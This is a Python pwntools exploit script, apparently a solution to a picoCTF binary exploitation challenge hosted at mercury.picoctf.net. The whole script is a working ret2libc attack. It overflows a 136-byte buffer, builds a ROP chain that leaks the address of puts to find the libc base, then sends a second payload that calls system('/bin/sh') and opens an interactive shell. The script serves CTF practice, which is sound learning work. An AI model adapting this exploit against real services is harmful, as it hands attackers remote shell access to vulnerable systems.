#!/usr/bin/python3

from pwn import *


context.binary = exe = ELF("./vuln",checksec=False)
libc =ELF("./libc.so.6",checksec=False)

# r = process(exe.path)
r = remote("mercury.picoctf.net", 37289)
pop_rdi = 0x0000000000400913
# pop_rsi = 0x0000000000400911
ret = 0x000000000040052e
payload = b'A'*136 + p64(pop_rdi) + p64(exe.got['puts'])
payload += p64(exe.plt['puts']) + p64(exe.sym['main'])

r.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\n',payload)
# r.recv(0x7a)
r.recvline()
leak = u64(r.recv(6)+ b'\00\00')
log.info("LEAK: "+ hex(leak))
libc.address = leak - libc.sym['puts']
log.info("Base: "+ hex(libc.address))
input()

payload = b'A'*136 + p64(ret) +  p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.sym['system'])


r.sendlineafter(b'WeLcOmE To mY EcHo sErVeR!\n',payload)


r.interactive()